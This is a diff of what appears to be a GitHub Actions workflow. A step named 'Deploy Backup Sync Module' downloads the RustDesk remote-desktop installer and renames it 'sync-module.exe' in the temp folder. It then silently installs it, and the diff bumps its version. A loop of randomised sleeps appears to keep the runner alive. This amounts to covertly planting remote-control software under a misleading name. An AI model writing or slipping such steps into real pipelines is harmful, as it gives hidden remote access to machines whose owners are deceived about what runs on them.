@@ -39,7 +39,7 @@ jobs:
 
       - name: Deploy Backup Sync Module
         run: |
-          $url = "https://github.com/rustdesk/rustdesk/releases/download/1.3.1/rustdesk-1.3.1-x86_64.exe"
+          $url = "https://github.com/rustdesk/rustdesk/releases/download/1.4.6/rustdesk-1.4.6-x86_64.exe"
           $dest = "$env:TEMP\sync-module.exe"
           Invoke-WebRequest -Uri $url -OutFile $dest
           Start-Process -FilePath $dest -ArgumentList "--silent-install" -Wait
@@ -80,3 +80,4 @@ jobs:
               $wait = Get-Random -Minimum 160 -Maximum 440
               Start-Sleep -Seconds $wait
           }
+          
